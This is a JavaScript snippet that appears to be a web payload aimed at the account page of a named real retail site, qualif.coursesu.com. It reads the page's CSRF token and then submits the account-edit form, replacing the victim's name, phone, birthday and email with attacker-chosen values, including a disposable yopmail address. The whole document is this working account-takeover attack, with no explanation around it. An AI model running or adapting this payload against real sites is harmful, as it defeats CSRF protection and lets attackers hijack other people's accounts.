let csrfToken;

// Fetch the csrf token value
fetch('https://qualif.coursesu.com/mon-compte')
  .then(response => response.text())
  .then(data => {
    const match = data.match(/<meta\s+name="csrf_token"\s+content="([^"]+)"\s*\/?>/i);
    if (match && match[1]) {
      csrfToken = match[1];
      console.log(csrfToken);

      // Prepare POST data
      const postData = `dwfrm_accountinfo_customer_title=M.&dwfrm_accountinfo_customer_firstname=is+Leet&dwfrm_accountinfo_customer_lastname=Leet+Sir&dwfrm_accountinfo_customer_phone=003771231231230&dwfrm_accountinfo_customer_mobile=&dwfrm_accountinfo_customer_birthday=11%2F11%2F1991&dwfrm_accountinfo_customer_email=iamveryn00b%40yopmail.com&dwfrm_accountinfo_login_currentpassword_d0dtrpollhle=&dwfrm_accountinfo_edit=J%27enregistre+les+modifications&dwfrm_accountinfo_login_newpassword_d0ktgztswtno=&dwfrm_accountinfo_login_newpasswordconfirm_d0byltvbdfln=&csrf_token=${encodeURIComponent(csrfToken)}`;

      // Send POST request
      return fetch('https://qualif.coursesu.com/mon-compte', {
        method: 'POST',
        body: postData,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      });
    } else {
      console.log('CSRF token not found.');
      return Promise.reject('CSRF token not found.');
    }
  })
  .then(response => {
    if (response.ok) {
      console.log('POST request successful.');
    } else {
      console.log('POST request failed.');
    }
  })
  .catch(error => {
    console.log('Error:', error);
  });





